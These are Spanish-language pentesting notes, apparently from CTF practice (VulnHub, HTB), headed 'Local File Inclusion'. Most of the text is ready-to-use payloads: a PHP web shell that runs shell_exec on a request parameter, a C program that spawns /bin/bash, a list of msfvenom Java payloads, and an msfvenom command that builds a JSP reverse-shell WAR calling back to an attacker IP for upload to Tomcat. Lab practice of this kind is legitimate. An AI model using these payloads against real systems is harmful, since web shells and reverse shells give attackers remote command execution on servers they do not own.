# LOCAL FILE INCLUSION LFI
---
## CREACIÓN PHP LFI .phar
Como se ha dicho al principio, el LFI ocurre cuando mediante un campo de entrada se está llamando a la ruta de un archivo local. Típicamente, esta situación la veremos en variables de PHP, pero no hay que limitar la vulnerabilidad a esto porque sería erróneo
```java
┌──(s3cur1ty3c㉿kali)-[~/CTF/vulnhub/venom/exploits]
└─$ cat pwned.phar        
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: pwned.phar
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │   echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
   3   │ ?>
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```
## CREACIÓN EXPLOIT LENGUAJE C

para crear un exploit de lenguaje c, se crear un archivo con la extensión .c y acontinuacion lo siguiente:
```java
#include <stdio.h>
#include <stdlib.h>
int main(void){
        system("/bin/bash");
        return 0;
}
```
Una vez creado el archivo se debe compilar para transformarlo en binario.
```java
gcc exploit.c -o binarioexploit
```
## CREACIÓN APACHE TOMCAT, .war MSFVENOM
Primero filtramos el exploit de java para crear tipo warm
```java 
┌──(s3cur1ty3c㉿kali)-[~/CTF/HTB/jerry/nmap]
└─$ msfvenom -l payloads | grep java 
┌──(s3cur1ty3c㉿kali)-[~/CTF/HTB/jerry/nmap]
└─$ msfvenom -l payloads | grep java 
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell
```
Creamos un payload con msfvenom y lo subimos a tomcat
```java 
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.95 LPORT=443 -f war -o shell.war
```java 
